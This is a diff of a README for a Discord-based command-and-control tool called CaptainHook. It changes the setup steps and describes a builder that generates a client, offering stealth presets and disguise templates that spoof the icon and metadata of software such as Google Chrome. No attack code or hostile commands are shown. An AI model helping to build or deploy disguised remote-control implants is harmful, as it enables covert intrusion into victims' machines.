@@ -18,21 +18,30 @@ CaptainHook is a high-performance Command & Control (C2) tool designed for ethic
 
 ## 🚀 Quick Start
 
-### 1. Requirements
-Install the necessary dependencies on your development machine:
+### 1. Requirements & Setup
+Clone the repository and set up a virtual environment to keep your system clean:
 ```bash
-pip install -r requirements.txt
+git clone YOUR_REPO_URL
+cd CaptainHook
+python3 -m venv .venv
+source .venv/bin/activate  # Windows: .venv\Scripts\activate
 ```
 
-### 2. The Builder
-Launch the **Architect Builder** to generate your client:
+### 2. Professional Installation
+Install the project as a package:
 ```bash
-python src/builder/main.py
+pip install .
+```
+
+### 3. The Builder
+Launch the **Architect Builder** directly from your terminal:
+```bash
+captainhook
 ```
 1.  **Enter Credentials:** Provide your Discord Bot Token and Guild ID.
-2.  **Select Preset:** Choose a pre-configured mode (e.g., `👻 Ghost` for maximum stealth).
-3.  **Select Disguise:** Choose a template (e.g., `Google Chrome`) to spoof the icon and metadata.
-4.  **Deploy:** The builder will prepare a "Staged" version of the client ready for compilation.
+2.  **Select Preset:** Choose a pre-configured mode.
+3.  **Select Disguise:** Choose a template to spoof the icon and metadata.
+4.  **Deploy:** The builder will prepare a "Staged" version of the client.
 
 ---
 
